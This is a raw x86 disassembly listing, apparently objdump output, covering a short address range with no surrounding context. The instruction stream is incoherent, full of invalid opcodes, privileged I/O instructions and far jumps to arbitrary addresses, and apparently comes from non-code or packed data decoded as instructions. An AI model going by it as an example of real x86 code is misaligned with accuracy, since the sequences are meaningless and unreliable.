  41ca5d:	add    BYTE PTR [ecx+0x7db2c53f],0x2
  41ca64:	fcom   DWORD PTR [ebx]
  41ca66:	mov    ebx,0x84836d38
  41ca6b:	sbb    al,0x54
  41ca6d:	fcom   DWORD PTR [ebp+eiz*8-0x8]
  41ca71:	imul   ebp,DWORD PTR [esp+ecx*2],0xcae0019e
  41ca78:	inc    ebx
  41ca79:	inc    esp
  41ca7a:	pop    ds
  41ca7b:	repnz lds ecx,FWORD PTR [ebx]
  41ca7e:	aaa    
  41ca7f:	(bad)  
  41ca80:	scas   al,BYTE PTR es:[edi]
  41ca81:	in     eax,dx
  41ca82:	inc    esp
  41ca83:	out    0x81,al
  41ca85:	sbb    al,0x50
  41ca87:	mov    BYTE PTR [eax+0x630c15a3],dl
  41ca8d:	pop    ss
  41ca8e:	pushf  
  41ca8f:	fidivr DWORD PTR [edi-0x69282727]
  41ca95:	(bad)  
  41ca96:	cs sbb al,0xef
  41ca99:	test   edx,eax
  41ca9b:	sti    
  41ca9c:	aad    0x3f
  41ca9e:	outs   dx,DWORD PTR ds:[esi]
  41ca9f:	dec    edx
  41caa0:	mov    cl,0x9f
  41caa2:	pusha  
  41caa3:	lea    ebx,[eax+0x41]
  41caa6:	outs   dx,BYTE PTR ds:[esi]
  41caa7:	inc    eax
  41caa8:	xchg   DWORD PTR [eax-0x70],ebx
  41caab:	add    DWORD PTR [eax],eax
  41caad:	cmp    ecx,DWORD PTR [ebp+0x20]
  41cab0:	dec    edi
  41cab1:	call   0x8592:0xaf113f68
  41cab8:	cwde   
  41cab9:	pop    eax
  41caba:	push   cs
  41cabb:	ror    BYTE PTR [edx-0x36],cl
  41cabe:	xchg   BYTE PTR [ecx-0x26],al
  41cac1:	pop    ecx
  41cac2:	iret   
  41cac3:	fld    TBYTE PTR [ecx*1-0x418e389c]
  41caca:	dec    ebp
  41cacb:	and    al,BYTE PTR [esi]
  41cacd:	sub    BYTE PTR [ebx],cl
  41cacf:	add    bl,BYTE PTR [eax-0x14]
  41cad2:	mov    WORD PTR ds:0xc3629b3e,?
  41cad8:	into   
  41cad9:	faddp  st(1),st
  41cadb:	adc    BYTE PTR [edi+0x65fba0cc],cl
  41cae1:	ins    DWORD PTR es:[edi],dx
  41cae2:	cmc    
  41cae3:	mov    edi,0x8e78df69
  41cae8:	xor    dl,BYTE PTR [ebp+0x72]
  41caeb:	inc    eax
  41caec:	pop    ebp
  41caed:	fs xchg edi,eax
  41caef:	bound  esp,QWORD PTR [eax]
  41caf1:	nop
  41caf2:	call   0x41b3cdfd
  41caf7:	or     bh,BYTE PTR [edx-0x38]
  41cafa:	mov    esi,0x4cb9bb2d
  41caff:	jmp    0x41cb63
  41cb01:	pop    sp
  41cb03:	and    eax,0xdc9000a6
  41cb08:	repz call DWORD PTR [edx+0x4954b28e]
  41cb0f:	push   es
  41cb10:	loopne 0x41cb69
  41cb12:	jmp    0x3346:0xef6c5d6e
  41cb19:	sub    al,0xd0
  41cb1b:	lock sti 
  41cb1d:	loopne 0x41cb50
  41cb1f:	mov    es,ecx
  41cb21:	shl    eax,1
  41cb23:	cmp    eax,0x8dd63a9
  41cb28:	xor    DWORD PTR [edi-0x1b5d991e],ebx
  41cb2e:	pop    ecx
  41cb2f:	call   0x7ec3fe88
  41cb34:	lods   al,BYTE PTR ds:[esi]
  41cb35:	mov    dh,0x82
  41cb37:	mov    al,ds:0xc0dd4c37
  41cb3c:	lods   eax,DWORD PTR ds:[esi]
  41cb3d:	inc    esi
  41cb3e:	ror    esp,1
  41cb40:	(bad)  
  41cb41:	into   
  41cb42:	inc    edx
  41cb43:	adc    ecx,DWORD PTR [edx-0x642ea9da]
  41cb49:	jmp    0xa3ea5abb
  41cb4e:	add    ebx,DWORD PTR [ebx]
  41cb50:	xor    al,0xc
  41cb52:	jne    0x41cbaf
  41cb54:	mov    edx,0xa19c6b04
  41cb59:	gs push ss
  41cb5b:	sub    esp,DWORD PTR [eax]
  41cb5d:	out    dx,eax
  41cb5e:	call   0xf8603597
  41cb63:	and    esi,ebx
  41cb65:	pusha  
  41cb66:	data16 (bad) [edx]
  41cb69:	daa    
  41cb6a:	pop    edx
  41cb6b:	aaa    
  41cb6c:	fdiv   DWORD PTR [ecx-0x4944a11a]
  41cb72:	pop    esi
  41cb73:	test   eax,0x64ada2a5
  41cb78:	xor    DWORD PTR [esi+edi*4-0x26],esp
  41cb7c:	and    dh,BYTE PTR [esi-0x7b6a856e]
  41cb82:	xlat   BYTE PTR ds:[ebx]
  41cb83:	xor    eax,0xb1ef1806
  41cb88:	fisubr DWORD PTR [esi]
  41cb8a:	ss clc 
  41cb8c:	sub    ecx,DWORD PTR [edx]
  41cb8e:	jmp    0xeb5c:0x41ac8c70
  41cb95:	xlat   BYTE PTR ds:[ebx]
  41cb96:	jl     0x41cba5
  41cb98:	stos   DWORD PTR es:[edi],eax
  41cb99:	cdq    
  41cb9a:	leave  
  41cb9b:	fst    QWORD PTR [edx+0x541796f2]
  41cba1:	xor    BYTE PTR [eax],al
  41cba3:	xor    bh,cl
  41cba5:	adc    esi,DWORD PTR [eax+edx*1]
  41cba8:	lea    ebx,[esi]
  41cbaa:	inc    edx
  41cbab:	jmp    0x9e66:0x597bf9db
  41cbb2:	lahf   
  41cbb3:	jae    0x41cb3d
  41cbb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cbb6:	pop    es
  41cbb7:	pop    ebp
  41cbb8:	push   ebp
  41cbb9:	xchg   ebp,eax
  41cbba:	mov    ah,BYTE PTR [eax]
  41cbbc:	pop    es
  41cbbd:	adc    al,0x6a
  41cbbf:	push   ds
  41cbc0:	ror    edi,0x3e
  41cbc3:	mov    esi,DWORD PTR [eax]
  41cbc5:	push   eax
  41cbc6:	add    cl,BYTE PTR ss:[eax]
  41cbc9:	push   cs
  41cbca:	mov    al,0x1a
  41cbcc:	push   edi
  41cbcd:	pop    ecx
  41cbce:	not    ecx
  41cbd0:	add    BYTE PTR [edx+0x7],ah
  41cbd3:	shl    DWORD PTR [esi-0x7d2b75be],cl
  41cbd9:	mov    dh,al
  41cbdb:	jae    0x41cc03
  41cbdd:	(bad)  
  41cbde:	sub    al,0xd3
  41cbe0:	repz pop edi
  41cbe2:	pop    ecx
  41cbe3:	lahf   
  41cbe4:	dec    ecx
  41cbe5:	gs call 0x455b:0xf1dfdc0b
  41cbed:	jb     0x41cc03
  41cbef:	sbb    al,0xe1
  41cbf1:	pop    eax
  41cbf2:	cmc    
  41cbf3:	lock cmc 
  41cbf5:	jmp    0x5551:0x84ff0034
  41cbfc:	aam    0xf3
  41cbfe:	and    al,0xa4
  41cc00:	repnz ror BYTE PTR [esp+eax*8+0x49],1
  41cc05:	(bad)  
  41cc06:	mov    al,ds:0x17d67204
  41cc0b:	push   esp
  41cc0c:	dec    ebx
  41cc0d:	imul   edx,DWORD PTR [ecx],0xffffffb6
  41cc10:	push   ds
  41cc11:	sbb    eax,0x57494a50
  41cc16:	gs push es
  41cc18:	mov    ecx,0x52c8478f
  41cc1d:	cmp    eax,0xb4b112ab
  41cc22:	dec    ebp
  41cc23:	scas   al,BYTE PTR es:[edi]
  41cc24:	mov    ebx,0x622ec821
  41cc29:	pop    esi
  41cc2a:	pop    eax
  41cc2b:	out    dx,al
  41cc2c:	mov    ah,0x53
  41cc2e:	and    DWORD PTR [edx+ebx*4],eax
  41cc31:	mov    dh,0xf1
  41cc33:	dec    eax
  41cc34:	jp     0x41cc52
  41cc36:	adc    ecx,DWORD PTR [ebx]
  41cc38:	mov    esp,0xdafeccf1
  41cc3d:	lahf   
  41cc3e:	and    eax,0x246f604e
  41cc43:	push   eax
  41cc44:	in     eax,0x79
  41cc46:	xchg   esp,eax
  41cc47:	or     eax,0x73aba97
  41cc4c:	sub    BYTE PTR [ebx+0x25],cl
  41cc4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc50:	pop    ss
  41cc51:	mov    eax,0xaa085076
  41cc56:	in     eax,0x86
  41cc58:	push   ss
  41cc59:	sahf   
  41cc5a:	lea    esp,[esi+eax*8+0x3f]
  41cc5e:	clc    
  41cc5f:	stos   BYTE PTR es:[edi],al
  41cc60:	cs test al,0xc7
  41cc63:	into   
  41cc64:	sbb    BYTE PTR ds:0xad7f63b6,ch
  41cc6a:	or     esp,DWORD PTR [ebx-0x5e394190]
  41cc70:	test   BYTE PTR [ebx+0x2c26ef5],0xbb
  41cc77:	in     al,dx
  41cc78:	stos   DWORD PTR es:[edi],eax
  41cc79:	out    0x91,eax
  41cc7b:	sbb    eax,DWORD PTR [edi-0x5e]
  41cc7e:	ret    
  41cc7f:	sbb    cl,dh
  41cc81:	and    eax,0xcf74aa95
  41cc86:	and    eax,0x8900ed00
  41cc8b:	jg     0x41ccc7
  41cc8d:	add    BYTE PTR [ebx+0x2f527be7],dl
  41cc93:	adc    BYTE PTR [edi+0x4a],ah
  41cc96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc97:	or     dh,0x71
  41cc9a:	gs gs into 
  41cc9d:	push   edi
  41cc9e:	(bad)  
  41cca0:	cdq    
  41cca1:	fsub   DWORD PTR [edx]
  41cca3:	push   ecx
  41cca4:	xchg   DWORD PTR [edi+edi*8],esp
  41cca7:	(bad)  
  41cca9:	dec    ebx
  41ccaa:	iret   
  41ccab:	sbb    DWORD PTR [eax+ecx*4],ebx
  41ccae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ccaf:	or     esi,DWORD PTR [esi-0x1f]
  41ccb2:	sbb    eax,0xd2033202
  41ccb7:	retf   0x20b
  41ccba:	push   ss
  41ccbb:	popf   
  41ccbc:	inc    ebp
  41ccbd:	cmp    ebx,eax
  41ccbf:	and    eax,0x5e8d2866
  41ccc4:	loop   0x41cc88
  41ccc6:	mov    edi,0x7b071f18
  41cccb:	mov    ebp,DWORD PTR [ebp+0x34f92856]
  41ccd1:	loopne 0x41cc77
  41ccd3:	cmp    al,0xcd
  41ccd5:	out    0x7d,al
  41ccd7:	xlat   BYTE PTR ds:[ebx]
  41ccd8:	or     eax,esp
  41ccda:	jb     0x41cd1f
  41ccdc:	mov    ch,0x51
  41ccde:	push   ecx
  41ccdf:	int    0x2d
  41cce1:	mov    al,ds:0x7abb3cbe
  41cce6:	mov    ebp,0xae306b25
  41cceb:	cmp    DWORD PTR [edx],ebx
  41cced:	fcmovbe st,st(4)
  41ccef:	sub    ch,al
  41ccf1:	sbb    bh,BYTE PTR [ebx+0x43]
  41ccf4:	aad    0x70
  41ccf6:	add    al,0x32
  41ccf8:	sbb    ebx,ebp
  41ccfa:	and    al,0xd6
  41ccfc:	xchg   edi,eax
  41ccfd:	imul   BYTE PTR [edi+edx*8]
  41cd00:	sub    dl,bh
  41cd02:	push   ecx
  41cd03:	ret    
  41cd04:	xchg   esp,eax
  41cd05:	mov    edi,0x5779fded
  41cd0a:	jb     0x41ccd1
  41cd0c:	and    edx,edi
  41cd0e:	imul   cx,WORD PTR [esi*1+0x57153271],0x37d0
  41cd18:	out    dx,eax
  41cd19:	shl    ebx,0xb2
  41cd1c:	pop    es
  41cd1d:	retf   
  41cd1e:	(bad)  
  41cd1f:	fcom   DWORD PTR [ebx+0x50]
  41cd22:	mov    edx,DWORD PTR [ebp-0x58]
  41cd25:	xchg   esi,eax
  41cd26:	(bad)  
  41cd27:	push   0xe6f8a5bd
  41cd2c:	push   edi
  41cd2d:	mov    ebx,0x3a5c58d8
  41cd32:	push   edx
  41cd33:	sbb    DWORD PTR [edi+0x62],esi
  41cd36:	ins    DWORD PTR es:[edi],dx
  41cd37:	ss nop
  41cd39:	ins    BYTE PTR es:[edi],dx
  41cd3a:	jmp    0x99c338d9
  41cd3f:	xor    DWORD PTR [esi+0x25],ebx
  41cd42:	add    BYTE PTR [ecx],ch
  41cd44:	push   0xffffffc8
  41cd46:	ds dec esi
  41cd48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd49:	push   cs
  41cd4a:	push   es
  41cd4b:	(bad)  
  41cd4e:	bound  ebp,QWORD PTR [ebx-0x4195f868]
  41cd54:	sub    eax,0xc1b0977c
  41cd59:	push   esp
  41cd5a:	jle    0x41cd7b
  41cd5c:	mov    ah,0x1f
  41cd5e:	jae    0x41cd29
  41cd60:	inc    ebp
  41cd61:	xor    BYTE PTR [esp+edx*1-0x51],cl
  41cd65:	addr16 out 0xc6,eax
  41cd68:	mov    ch,0xb0
  41cd6a:	xor    ebx,DWORD PTR [edx]
  41cd6c:	jo     0x41cd29
  41cd6e:	jb     0x41cd0e
  41cd70:	sti    
  41cd71:	retf   
  41cd72:	mov    ebp,0x32d92027
  41cd77:	cmp    ch,dh
  41cd79:	push   edx
  41cd7a:	mov    esi,0x759fd755
  41cd7f:	mov    ah,0xde
  41cd81:	sub    ah,BYTE PTR [eax]
  41cd83:	(bad)  
  41cd85:	fistp  QWORD PTR [ebp+0x2]
  41cd88:	fcmovne st,st(4)
  41cd8a:	sbb    esp,DWORD PTR [esp+esi*4-0x9]
  41cd8e:	mov    bh,BYTE PTR [ebp+0x2e]
  41cd91:	pop    ss
  41cd92:	xor    ah,BYTE PTR [ecx+esi*1]
  41cd95:	xlat   BYTE PTR ds:[ebx]
  41cd96:	or     ebx,edx
  41cd98:	dec    edi
  41cd99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd9a:	call   0x51b3:0x54738baf
  41cda1:	leave  
  41cda2:	lods   al,BYTE PTR ds:[esi]
  41cda3:	hlt    
  41cda4:	adc    al,0xd
  41cda6:	jl     0x41cd7f
  41cda8:	cmp    eax,0xcf358039
  41cdad:	push   ecx
  41cdae:	push   ss
  41cdaf:	mov    WORD PTR [edi],?
  41cdb1:	nop
  41cdb2:	ins    DWORD PTR es:[edi],dx
  41cdb3:	retf   
  41cdb4:	pop    ss
  41cdb5:	dec    esp
  41cdb6:	pop    esp
  41cdb7:	jmp    0x870bce8f
  41cdbc:	pop    ebx
  41cdbd:	xchg   esp,eax
  41cdbe:	adc    al,0xf1
  41cdc0:	pop    es
  41cdc1:	ret    0x922d
  41cdc4:	es jbe 0x41ce29
  41cdc7:	int3   
  41cdc8:	mov    ebp,0x63f58223
  41cdcd:	clc    
  41cdce:	and    BYTE PTR [edx-0x467af773],bl
  41cdd4:	sub    al,0x14
  41cdd6:	mov    WORD PTR [edx],es
  41cdd8:	mov    dh,0xf
  41cdda:	in     eax,dx
  41cddb:	cwde   
  41cddc:	xchg   BYTE PTR [ecx+0x7d369c49],ch
  41cde2:	loopne 0x41cd8c
  41cde4:	test   eax,0x55c9d834
  41cde9:	stc    
  41cdea:	mov    esi,0xf48ed726
  41cdef:	adc    esi,DWORD PTR ss:[ebx-0x12b3ee45]
  41cdf6:	out    dx,eax
  41cdf7:	pop    edx
  41cdf8:	fldcw  WORD PTR [eax-0x33cfac95]
  41cdfe:	fcomp  DWORD PTR [esi+0x16]
  41ce01:	sub    cl,ch
  41ce03:	or     eax,0xca5cd751
  41ce08:	push   edi
  41ce09:	xchg   edx,eax
  41ce0a:	mov    WORD PTR [ebp+0x10],ss
  41ce0d:	out    0x28,eax
  41ce0f:	and    al,0xab
  41ce11:	add    BYTE PTR [edx+0x69e05810],0xd6
  41ce18:	test   BYTE PTR [ebx-0x26],ah
  41ce1b:	jnp    0x41cda6
  41ce1d:	mov    dh,BYTE PTR [ebx]
  41ce1f:	call   0x42a36525
  41ce24:	mov    al,ds:0xe708bbba
  41ce29:	cld    
  41ce2a:	jmp    0x7688:0xb16493c
  41ce31:	lea    ebx,[ecx]
  41ce33:	and    eax,0x7904aae8
  41ce38:	ret    
  41ce39:	out    0x43,eax
  41ce3b:	popf   
  41ce3c:	mov    ecx,0x444889a7
  41ce41:	mov    bl,0xc8
  41ce43:	xor    al,0x2b
  41ce45:	mov    ds:0xa19007ef,eax
  41ce4a:	hlt    
  41ce4b:	enter  0x1c4b,0xa0
  41ce4f:	mov    al,0x9c
  41ce51:	dec    ebp
  41ce52:	ret    
  41ce53:	lods   al,BYTE PTR ds:[esi]
  41ce54:	jl     0x41ce46
  41ce56:	sar    DWORD PTR [edi+0x41],0x67
  41ce5a:	add    eax,0x24ac4fdc
  41ce5f:	out    dx,al
  41ce60:	lock jmp 0x1f3d0dd0
  41ce66:	adc    ebp,DWORD PTR [eax-0x70da6c23]
  41ce6c:	out    0xc2,eax
  41ce6e:	add    ebp,ebx
  41ce70:	jmp    0xad7c2c9f
  41ce75:	jb     0x41ceac
  41ce77:	(bad)  
  41ce78:	call   0x139221df
  41ce7d:	adc    ebx,DWORD PTR [esi+0x3ff565a3]
  41ce83:	outs   dx,BYTE PTR ds:[esi]
  41ce84:	xor    eax,0xef9114cf
  41ce89:	jmp    0xa7e9:0x730df110
  41ce90:	cli    
  41ce91:	je     0x41cec6
  41ce93:	jmp    0x41cea4
  41ce95:	repnz stc 
  41ce97:	shl    BYTE PTR [edi],1
  41ce99:	(bad)  
  41ce9a:	daa    
  41ce9b:	rcr    BYTE PTR [esi*2-0x25f1a679],1
  41cea2:	mov    ch,0x3e
  41cea4:	pusha  
  41cea5:	mov    edi,0x46c45a0
  41ceaa:	les    esi,FWORD PTR [eax]
  41ceac:	sbb    cl,BYTE PTR [ebp+0x1f585f53]
  41ceb2:	jmp    FWORD PTR [edi]
  41ceb4:	call   0x557b:0x80bcdc60
  41cebb:	mov    ds:0x5711d17e,al
  41cec0:	jle    0x41ce45
  41cec2:	lahf   
  41cec3:	xchg   edi,eax
  41cec4:	jle    0x41cef4
  41cec6:	sbb    DWORD PTR [edx],esp
  41cec8:	rcl    DWORD PTR ds:0xe6681cef,1
  41cece:	jl     0x41cf4d
  41ced0:	and    BYTE PTR [edi],0x5a
  41ced3:	fisubr WORD PTR [ebp+0x16]
  41ced6:	mov    ebp,0x16a8ac5f
  41cedb:	mov    ds:0x8cf1fffc,eax
  41cee0:	lock ss loope 0x41cec4
  41cee4:	(bad)  
  41cee5:	mov    bl,0x13
  41cee7:	inc    ebx
  41cee8:	pop    esi
  41cee9:	or     ebx,DWORD PTR [ecx+0x16e89189]
  41ceef:	sbb    eax,0xef862025
  41cef4:	push   edi
  41cef5:	lods   eax,DWORD PTR ds:[esi]
  41cef6:	sbb    eax,0x6ea28cfd
  41cefb:	int3   
  41cefc:	xor    DWORD PTR [esi],ecx
  41cefe:	ss pop edx
  41cf00:	push   ss
  41cf01:	stc    
  41cf02:	gs jg  0x41cf54
  41cf05:	in     al,dx
  41cf06:	adc    ah,cl
  41cf08:	cdq    
  41cf09:	fyl2x  
  41cf0b:	loop   0x41cf33
  41cf0d:	pop    ds
  41cf0e:	mov    al,0xe8
  41cf10:	leave  
  41cf11:	pop    ebx
  41cf12:	aam    0x18
  41cf14:	rcl    DWORD PTR [ebx],cl
  41cf16:	jmp    0x3fa0:0x9c993cec
  41cf1d:	call   0xc6f73dfe
  41cf22:	data16 out dx,al
  41cf24:	add    dl,BYTE PTR [edi+eax*2-0x75]
  41cf28:	pusha  
  41cf29:	daa    
  41cf2a:	xchg   esi,eax
  41cf2b:	adc    eax,0xcc7ec1e6
  41cf30:	sbb    DWORD PTR [edx+0x22],ebx
  41cf33:	cwde   
  41cf34:	sbb    DWORD PTR [edi-0x26356426],ebx
  41cf3a:	push   0xe80d5960
  41cf3f:	mov    edx,0xaeb04025
  41cf44:	shl    DWORD PTR [ebp-0x4a0021b8],1
  41cf4a:	inc    eax
  41cf4b:	pop    ss
  41cf4c:	imul   ecx,eax,0xfffffff2
  41cf4f:	arpl   WORD PTR ds:0x9413fb78,bp
  41cf55:	mov    WORD PTR [ebx+0xa],fs
  41cf58:	fwait
  41cf59:	mov    ecx,0xb7f9c6f8
  41cf5e:	loop   0x41cf82
  41cf60:	cli    
  41cf61:	sbb    esi,DWORD PTR [esi+ecx*1-0x5c]
  41cf65:	sub    BYTE PTR [edx+0x7a],ch
  41cf68:	add    bh,BYTE PTR [ecx-0x31]
  41cf6b:	aad    0x43
  41cf6d:	jo     0x41cfcb
  41cf6f:	das    
  41cf70:	jns    0x41cf91
  41cf72:	sub    esp,DWORD PTR [ebx+0x14]
  41cf75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf76:	inc    ebp
  41cf77:	fsub   DWORD PTR [esi+ecx*8+0x25491e70]
  41cf7e:	mov    eax,ds:0x9514c9f
  41cf83:	jecxz  0x41cf89
  41cf85:	xchg   ebx,eax
  41cf86:	jo     0x41cfae
  41cf88:	adc    DWORD PTR [ebx+0x611ea0b1],edi
  41cf8e:	icebp  
  41cf8f:	hlt    
  41cf90:	pop    esi
  41cf91:	lahf   
  41cf92:	jno    0x41cf2c
  41cf94:	adc    eax,ebx
  41cf96:	lahf   
  41cf97:	adc    eax,0xedc2f31f
  41cf9c:	ror    BYTE PTR [edi-0x61],0x3a
  41cfa0:	cmp    BYTE PTR [esi-0x10280a0],ah
  41cfa6:	mov    gs,WORD PTR [edx-0x25]
  41cfa9:	cmp    ecx,DWORD PTR [ebx-0xe]
  41cfac:	out    dx,eax
  41cfad:	outs   dx,DWORD PTR ds:[esi]
  41cfae:	sar    DWORD PTR [ebx-0x5abbad88],0x6
  41cfb5:	stos   BYTE PTR es:[edi],al
  41cfb6:	mov    ecx,0xb7545e17
  41cfbb:	xchg   esp,eax
  41cfbc:	mov    bl,0xef
  41cfbe:	jecxz  0x41cf9b
  41cfc0:	fcomp  DWORD PTR [eax]
  41cfc2:	stos   DWORD PTR es:[edi],eax
  41cfc3:	imul   edx,ebx,0xeb2b83b8
  41cfc9:	pop    ebx
  41cfca:	repz dec edx
  41cfcc:	out    dx,ax
  41cfce:	inc    ebx
  41cfcf:	mov    ds:0xaf147a22,eax
  41cfd4:	(bad)  
  41cfd5:	mov    al,0x8c
  41cfd7:	mov    cl,0x8f
  41cfd9:	(bad)  
  41cfda:	cmp    ch,BYTE PTR [esi+0x60f50ede]
  41cfe0:	inc    ebx
  41cfe1:	mov    bh,0x77
  41cfe3:	(bad)  
  41cfe4:	mov    ch,0x1f
  41cfe6:	pop    esi
  41cfe7:	mov    bl,0x6c
  41cfe9:	mov    al,ch
  41cfeb:	ror    DWORD PTR [ebp-0x48],0xd6
  41cfef:	stc    
  41cff0:	and    BYTE PTR [edi-0x23],bh
  41cff3:	inc    esi
  41cff4:	xchg   esi,eax
  41cff5:	ret    0xdab3
  41cff8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cff9:	or     BYTE PTR [ebx],0xea
  41cffc:	adc    edi,DWORD PTR [eax]
  41cffe:	js     0x41cfe7
  41d000:	inc    ebp
  41d001:	or     ebx,DWORD PTR [esi-0x3c70144c]
  41d007:	pop    edi
  41d008:	jne    0x41d086
  41d00a:	adc    BYTE PTR [eax+ebp*2-0x1f],bh
  41d00e:	jne    0x41d008
  41d010:	js     0x41d03d
  41d012:	pop    ebx
  41d013:	aam    0x32
  41d015:	dec    esi
  41d016:	sbb    BYTE PTR [eax-0x4c],ch
  41d019:	or     eax,0x95203422
  41d01e:	imul   edi,DWORD PTR ds:0x99bb0e39,0xdeff81da
  41d028:	ret    0x650a
  41d02b:	imul   esi,edi,0xffffffed
  41d02e:	stos   DWORD PTR es:[edi],eax
  41d02f:	es sbb dh,ch
  41d032:	imul   edi,DWORD PTR [ebx+edx*8+0x5e],0x2bba7802
  41d03a:	pop    edx
  41d03b:	imul   edx,ebx,0x40c2b58f
  41d041:	outs   dx,DWORD PTR ds:[esi]
  41d042:	(bad)  [ebx-0x3cceb4b6]
  41d048:	jmp    0x7135:0xa9d9d695
  41d04f:	or     BYTE PTR [ecx+0x75468156],dl
  41d055:	ins    BYTE PTR es:[edi],dx
  41d056:	mov    al,0x72
  41d058:	and    DWORD PTR [edx-0x1f],edx
  41d05b:	push   esp
  41d05c:	or     edx,DWORD PTR [eax+0x4a4323b5]
  41d062:	enter  0x8b55,0x32
  41d066:	stos   BYTE PTR es:[edi],al
  41d067:	repz loope 0x41d0bd
  41d06a:	mov    ds:0x5b48f06b,eax
  41d06f:	mov    ch,0x70
  41d071:	xchg   esp,eax
  41d072:	inc    esp
  41d073:	sub    edi,edi
  41d075:	jno    0x41d06a
  41d077:	stos   DWORD PTR es:[edi],eax
  41d078:	or     BYTE PTR [ebp+0x47],0xc7
  41d07c:	iret   
  41d07d:	arpl   WORD PTR [esi],ax
  41d07f:	ficomp WORD PTR ds:0x826f07a
  41d085:	stc    
  41d086:	test   ah,0x95
  41d089:	xchg   ebp,eax
  41d08a:	(bad)
  41d08e:	sub    eax,0xd3afda06
  41d093:	pop    ebx
  41d094:	shr    ch,1
  41d096:	add    al,BYTE PTR ds:[ebx+eiz*4+0x690a266e]
  41d09e:	mov    al,0xc
  41d0a0:	mov    al,ds:0x668684a1
  41d0a5:	push   eax
  41d0a6:	jo     0x41d10e
  41d0a8:	jl     0x41d06b
  41d0aa:	push   edi
  41d0ab:	jmp    0x41d0d2
  41d0ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d0ae:	jbe    0x41d07a
  41d0b0:	bound  ebx,QWORD PTR [esi]
  41d0b2:	les    ebx,FWORD PTR [eax+0x6484960b]
  41d0b8:	fcom   DWORD PTR [esp+eiz*4+0x18]
  41d0bc:	push   ecx
  41d0bd:	ss rep stos BYTE PTR es:[edi],al
  41d0c0:	ja     0x41d0a0
  41d0c2:	xchg   DWORD PTR [ebp-0x1fbe306d],eax
  41d0c8:	imul   esi,DWORD PTR [ebx+0x7e],0xa67bc4d4
  41d0cf:	inc    eax
  41d0d0:	(bad)  
  41d0d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d0d2:	dec    eax
  41d0d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d0d4:	cld    
  41d0d5:	jl     0x41d103
  41d0d7:	not    BYTE PTR [edx-0x4f11aa9b]
  41d0dd:	xor    DWORD PTR [esi],eax
  41d0df:	lods   eax,DWORD PTR ds:[esi]
  41d0e0:	into   
  41d0e1:	in     eax,0xf4
  41d0e3:	fisttp QWORD PTR [esi+0x3b]
  41d0e6:	leave  
  41d0e7:	push   0xffffffb1
  41d0e9:	xchg   BYTE PTR [esi],ch
  41d0eb:	scas   eax,DWORD PTR es:[edi]
  41d0ec:	pushf  
  41d0ed:	pop    esp
  41d0ee:	jae    0x41d10d
  41d0f0:	ins    DWORD PTR es:[edi],dx
  41d0f1:	mov    al,0xda
  41d0f3:	imul   ebp,DWORD PTR [si+0x34],0xffffffd6
  41d0f8:	out    dx,eax
  41d0f9:	fnstcw WORD PTR [eax]
  41d0fb:	shl    cl,0xad
  41d0fe:	inc    edi
  41d0ff:	cli    
  41d100:	mov    bl,0x6b
  41d102:	pop    edx
  41d103:	in     al,dx
  41d104:	lahf   
  41d105:	adc    DWORD PTR [edx-0x151c8548],ebx
  41d10b:	dec    esi
  41d10c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d10d:	stos   DWORD PTR es:[edi],eax
  41d10e:	fdivrp st(3),st
  41d110:	mov    dh,0x68
  41d112:	jne    0x41d0ad
  41d114:	mov    ds:0x83f1524d,eax
  41d119:	and    bl,al
  41d11b:	jmp    0x41d15e
  41d11d:	shl    BYTE PTR [esi-0x5b],1
  41d120:	(bad)  
  41d121:	mov    bh,0x59
  41d123:	div    BYTE PTR [ebp-0x32]
  41d126:	push   0xffffffc9
  41d128:	adc    ch,dh
  41d12a:	in     al,0x70
  41d12c:	xchg   BYTE PTR [ecx+0x2a],bl
  41d12f:	xchg   edx,eax
  41d130:	push   edi
  41d131:	add    eax,0x6a25ee0b
  41d136:	cs mov dh,0x79
  41d139:	les    eax,FWORD PTR [edi-0x26932397]
  41d13f:	loop   0x41d174
  41d141:	icebp  
  41d142:	test   DWORD PTR [eax-0xb3b8150],ecx
  41d148:	test   ebp,edx
  41d14a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d14b:	jp     0x41d16d
  41d14d:	into   
  41d14e:	iret   
  41d14f:	mov    esp,0xa87863c4
  41d154:	mov    edx,ecx
  41d156:	jmp    0x5289:0xdb007953
  41d15d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d15e:	outs   dx,BYTE PTR ds:[esi]
  41d15f:	xchg   edi,eax
  41d160:	je     0x41d170
  41d162:	ds inc ecx
  41d164:	push   ss
  41d165:	push   esi
  41d166:	test   BYTE PTR [edi+0x61],0xac
  41d16a:	jl     0x41d17c
  41d16c:	in     eax,0x70
  41d16e:	ret    0x50b6
  41d171:	retf   
  41d172:	rcr    BYTE PTR [ebp+0x2d],cl
  41d175:	bnd jle 0x41d164
  41d178:	mov    dh,0x3d
  41d17a:	dec    edi
  41d17b:	in     eax,0x5
  41d17d:	inc    esi
  41d17e:	sub    eax,0x3025666e
  41d183:	test   al,0xa9
  41d185:	dec    edx
  41d186:	ja     0x41d1eb
  41d188:	adc    DWORD PTR [edi+0x424cb2b7],esi
  41d18e:	test   eax,0x35019d37
  41d193:	xchg   ebx,eax
  41d194:	(bad)  
  41d195:	adc    DWORD PTR [edx],ebx
  41d197:	aam    0x3f
  41d199:	test   al,0xc8
  41d19b:	or     eax,ebp
  41d19d:	jo     0x41d145
  41d19f:	scas   al,BYTE PTR es:[edi]
  41d1a0:	fucomi st,st(0)
  41d1a2:	mov    ch,0x1
  41d1a4:	jo     0x41d1d1
  41d1a6:	leave  
  41d1a7:	ins    DWORD PTR es:[edi],dx
  41d1a8:	push   ds
  41d1a9:	sub    BYTE PTR [edi-0x60],dl
  41d1ac:	cmp    edi,eax
  41d1ae:	push   edi
  41d1af:	and    BYTE PTR [esi-0x69959863],bh
  41d1b5:	mov    WORD PTR [eax+edx*8-0x6a87d459],gs
  41d1bc:	xchg   ebx,eax
